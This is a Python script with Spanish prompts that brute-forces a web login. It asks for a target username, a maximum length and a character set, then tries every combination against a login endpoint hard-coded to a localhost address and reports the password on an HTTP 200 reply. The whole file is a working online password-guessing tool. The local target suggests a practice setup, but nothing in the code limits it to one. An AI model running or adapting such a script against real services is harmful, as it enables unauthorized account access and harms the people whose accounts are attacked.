import time, itertools
import requests
from requests.exceptions import RequestException

usuario = input("Usuario objetivo: ").strip()
if not usuario:
    print("Debe ingresar un usuario."); raise SystemExit(1)

max_len = int(input("Longitud máxima (ej. 3): ").strip()) 
alf = input("Alfabeto (digits|alpha|all) [digits]: ").strip() or "digits"
print_every = int(input("Imprimir cada N intentos [1000]: ").strip() or "1000")

DIGITS = "0123456789"
LOW = "abcdefghijklmnopqrstuvwxyz"
UP = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
SPECIAL = "!#$%&/()=?¡¿+[];:.,"

if alf == "digits":
    alfabeto = DIGITS
elif alf == "alpha":
    alfabeto = LOW + UP
elif alf == "all":
    alfabeto = DIGITS + LOW + UP + SPECIAL
else:
    print("Alfabeto desconocido."); raise SystemExit(1)

target = "http://127.0.0.1:8000/login"
inicio = time.time()
intentos = 0

try:
    for L in range(1, max_len + 1):
        for combo in itertools.product(alfabeto, repeat=L):
            candidato = "".join(combo)
            intentos += 1
            try:
                r = requests.post(target, data={"username": usuario, "password": candidato}, timeout=6)
                codigo = r.status_code
            except RequestException:
                if intentos % print_every == 0:
                    print(f"[{intentos}] error de red; último probado: '{candidato}'")
                continue

            if intentos % print_every == 0:
                print(f"[{intentos}] último probado: '{candidato}' -> HTTP {codigo}")

            if codigo == 200:
                dur = time.time() - inicio
                print("\n=== CONTRASEÑA DESCUBIERTA ===")
                print("Usuario:", usuario)
                print("Contraseña descubierta:", candidato)
                print("Intentos:", intentos)
                print(f"Tiempo: {dur:.3f}s")
                raise SystemExit(0)

except KeyboardInterrupt:
    print("\nInterrumpido por el usuario (Ctrl+C).")

print("\nFin. Intentos totales:", intentos)
print(f"Tiempo total: {time.time()-inicio:.3f}s")
